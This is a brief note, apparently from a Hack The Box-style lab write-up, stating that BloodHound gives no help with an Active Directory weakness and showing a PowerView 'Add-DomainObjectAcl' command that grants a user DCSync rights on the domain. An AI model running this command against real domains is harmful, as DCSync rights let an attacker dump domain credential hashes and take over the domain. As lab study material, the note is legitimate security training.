BloodHound does not provide assistance in exploiting this vulnerability.

![[Pasted image 20260101195848.png]]

![[Pasted image 20260101195817.png]]


![[Pasted image 20260101195936.png]]
```bash
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity s4vitar -Rights DCSync
```



